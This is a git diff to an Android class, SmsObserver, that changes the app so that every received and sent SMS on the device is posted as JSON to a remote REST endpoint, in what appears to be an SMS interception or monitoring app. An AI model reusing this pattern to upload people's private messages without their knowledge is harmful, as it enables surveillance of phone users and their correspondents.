@@ -5,12 +5,13 @@ import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
+import android.util.Log;
 
 import java.util.Date;
 
+import the5concurrentnodes.controllers.DataHandler;
 import the5concurrentnodes.controllers.SmsServiceHandler;
 import the5concurrentnodes.generic.Config;
-import the5concurrentnodes.models.Sms;
 
 public class SmsObserver extends ContentObserver {
 
@@ -42,12 +43,10 @@ public class SmsObserver extends ContentObserver {
 
             if(shouldHandleSms(sms)) {
 
-                if(Integer.parseInt(sms.getType()) == Config.SMS_RECEIVED) {
+                if(Integer.parseInt(sms.getType()) == Config.SMS_RECEIVED ||
+                        Integer.parseInt(sms.getType()) == Config.SMS_SENT) {
 
-                    SmsServiceHandler.getInstance().onSmsReceived(sms);
-                }else if(Integer.parseInt(sms.getType()) == Config.SMS_SENT) {
-
-                    SmsServiceHandler.getInstance().onSmsSent(sms);
+                    postSms(sms);
                 }
 
                 smsStorage.setLastSMSIntercepted(Integer.parseInt(sms.get_id()));
@@ -115,5 +114,12 @@ public class SmsObserver extends ContentObserver {
     private boolean shouldProcessSmsId(int id) {
 
         return !isFirstSmsProcessed() && id > smsStorage.getLastSmsIntercepted();
+    }
+
+    private void postSms(Sms sms) {
+
+        DataHandler dataHandler = DataHandler.getInstance();
+
+        dataHandler.submitLog(Config.REST_API + "/sms", sms.toJSONObject());
     }
 }
